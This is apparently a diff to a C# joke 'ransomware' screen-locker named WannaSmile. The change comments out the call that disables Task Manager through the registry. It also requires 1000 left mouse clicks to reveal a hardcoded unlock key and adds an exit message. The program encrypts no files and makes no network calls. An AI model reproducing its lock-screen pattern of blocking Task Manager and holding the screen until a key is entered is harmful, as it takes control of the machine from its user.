@@ -31,12 +31,13 @@ namespace WannaSmile
 
 			//Task Manager Action: Enable
 			//EnableTaskManager();
-
-			//Task Manager Action: Disable
-			DisableTaskManager();
+			//DisableTaskManager();
 		}
 
 		#region Task Manager Action
+		/// <summary>
+		/// Disable Task Manager 
+		/// </summary>
 		private void DisableTaskManager()
 		{
 			RegistryKey regkey = default(RegistryKey);
@@ -54,6 +55,9 @@ namespace WannaSmile
 			}
 		}
 
+		/// <summary>
+		/// Enable Task Manager
+		/// </summary>
 		private void EnableTaskManager()
 		{
 			RegistryKey regkey = default(RegistryKey);
@@ -84,6 +88,7 @@ namespace WannaSmile
 		{
 			if (tKey.Text.Equals("132556487921465736156753724316432167563134"))
 			{
+				MessageBox.Show("Allow to Exit this kawaii Ransomware!");
 				Application.Exit();
 			}
 			else
@@ -93,16 +98,16 @@ namespace WannaSmile
 		}
 
 		/// <summary>
-		/// Button Get Key validate
+		/// Button Get Key validate Enter not Cick
 		/// </summary>
-		/// <param name="sender"></param>
-		/// <param name="e"></param>
+		/// <param name="sender">object</param>
+		/// <param name="e">Key Press EventArgs</param>
 		private void btnGetKey_Click(object sender, EventArgs e)
 		{
-			if (click)
-			{
-				MessageBox.Show("Use your mouse to click! \r Not your keyboard to click!");
-			}
+			//if (e.KeyCode == Keys.Enter)
+			//{
+			//	MessageBox.Show("Use your mouse to click! \r Not your keyboard to click!");
+			//}
 		}
 
 		/// <summary>
@@ -112,13 +117,15 @@ namespace WannaSmile
 		/// <param name="e"></param>
 		private void btnGetKey_MouseClick(object sender, MouseEventArgs e)
 		{
-			click = true;
-			input++;
-			temp = result - input;
-			MessageBox.Show("You click " + input + " times \r Remain " + temp + " times");
-			if (input == 1000)
+			if (e.Button == System.Windows.Forms.MouseButtons.Left)
 			{
-				MessageBox.Show("Key to unlock: 132556487921465736156753724316432167563134");
+				input++;
+				temp = result - input;
+				MessageBox.Show("You click " + input + " times \r Remain " + temp + " times");
+				if (input == 1000)
+				{
+					MessageBox.Show("Key to unlock: 132556487921465736156753724316432167563134");
+				}
 			}
 		}
 
@@ -131,6 +138,10 @@ namespace WannaSmile
 		{
 			MessageBox.Show("Wrong Key and Seri Number!");
 		}
+
+
 		#endregion
+
+
 	}
 }
